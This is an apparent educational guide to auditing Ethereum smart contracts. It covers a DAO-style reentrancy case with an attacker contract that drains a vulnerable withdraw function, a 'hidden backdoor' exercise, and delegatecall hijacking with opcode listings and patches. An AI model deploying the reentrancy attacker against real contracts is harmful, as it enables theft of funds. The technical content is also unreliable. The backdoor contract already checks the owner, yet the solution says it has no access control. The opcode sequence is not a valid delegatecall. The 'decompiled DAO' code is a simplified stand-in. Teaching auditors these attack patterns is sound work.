# 🔍 Comprehensive Deep Dive into Reverse Engineering Smart Contracts & Opcode-Level Attacks

This advanced guide is designed for security researchers, auditors, and bounty hunters looking to reverse engineer real-world attacks and detect low-level smart contract vulnerabilities.

## 📌 1️⃣ Live Walkthrough: Reverse Engineering a Real-World Exploit

### 🎯 Case Study: The 2016 DAO Hack – $60M Stolen via Reentrancy

---

### 🛠️ Step 1: Extract the Contract Bytecode

1. Find the hacked DAO contract on Etherscan
2. Click “Contract” → “Bytecode”
3. Copy the raw **Hex Bytecode**

✅ This gives us the contract’s EVM-level representation.

---

### 🛠️ Step 2: Decompile the Bytecode into Solidity

**Tool:** [Dedaub Decompiler](https://library.dedaub.com/)

- Paste the DAO contract address or bytecode
- Dedaub converts it into Solidity-like pseudocode

**Decompiled Function Example:**

```solidity
function withdraw(uint256 amount) public {
    require(balance[msg.sender] >= amount, "Insufficient balance");
    msg.sender.call{value: amount}("");  // 🚨 Reentrancy vulnerability!
    balance[msg.sender] -= amount;
}
```

✅ You can now see how the attack drained ETH using reentrant calls.

---

### 🛠️ Step 3: Simulate the Attack with an Attacker Contract

```solidity
pragma solidity ^0.8.0;

contract DAO_Attacker {
    DAO_Vulnerable public dao;

    constructor(address _dao) {
        dao = DAO_Vulnerable(_dao);
    }

    function attack() public payable {
        dao.withdraw(1 ether);
    }

    receive() external payable {
        if (address(dao).balance > 1 ether) {
            dao.withdraw(1 ether);  // 🚨 Reentrant call exploits the bug!
        }
    }
}
```

✅ This simulates the DAO hack and validates the vulnerability.

## 📌 2️⃣ Hands-On Challenge: Reverse Engineer a Contract with Hidden Backdoors

### 🚨 The HiddenBackdoor Contract

```solidity
pragma solidity ^0.8.0;

contract HiddenBackdoor {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function transferOwnership(address newOwner) public {
        require(msg.sender == owner, "Not authorized");
        owner = newOwner;
    }

    function withdrawAll() public {
        require(msg.sender == owner, "Not authorized");
        payable(owner).transfer(address(this).balance);
    }
}
```

---

### 🚨 Your Challenge:

1. Find the hidden vulnerability
2. Explain how an attacker can exploit it
3. Patch the contract

---

### 🛠️ Step 1: Decompile with Dedaub

Look for:

- Unprotected state changes
- Ownership logic flaws

---

### 🛠️ Step 2: Scan with Slither

```bash
slither HiddenBackdoor.sol --detect backdoor
```

✅ Slither will flag unsafe ownership transfers.

---

### 🛠️ Step 3: Identify the Exploit

```solidity
function transferOwnership(address newOwner) public {
    owner = newOwner;  // 🚨 No access control!
}
```

⚠️ Anyone can take ownership — this is a hidden backdoor.

---

### 🛠️ Step 4: Patch the Vulnerability

```solidity
function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0), "Invalid address");
    owner = newOwner;
}
```

✅ Access control and input validation protect contract integrity.

## 📌 3️⃣ Deep Dive: Opcode-Level Attacks & EVM Bytecode Manipulation

### 🧠 Why Opcodes Matter

- Exploits like `delegatecall` and `selfdestruct` occur at the bytecode level
- Attackers obfuscate logic by modifying opcodes
- Auditors must be able to analyze raw bytecode to catch backdoors

---

### 🛠️ Step 1: Extract Bytecode

1. Find contract on Etherscan
2. Click “Bytecode”
3. Use a disassembler like [Ethervm.io](https://ethervm.io/decompile)

---

### 🛠️ Step 2: Identify a `delegatecall` Hijack

**Disassembled Opcode Example:**

```
PUSH1 0x00
CALLER
PUSH1 0x40
MLOAD
DUP1
SWAP1
DELEGATECALL
SSTORE
STOP
```

🚨 This sequence enables malicious contract logic to be injected via `delegatecall`.

---

### 🛠️ Step 3: Understand the Vulnerable Function

```solidity
function execute(address target, bytes calldata data) public {
    (bool success,) = target.delegatecall(data);
    require(success, "Execution failed");
}
```

⚠️ The attacker can pass **any contract** to execute arbitrary logic.

---

### 🛠️ Step 4: Mitigation

```solidity
function execute(address target, bytes calldata data) public onlyOwner {
    require(isSafe(target), "Unsafe contract!");
    (bool success,) = target.delegatecall(data);
    require(success, "Execution failed");
}
```

✅ Restricting `delegatecall` to trusted targets prevents hijacks.
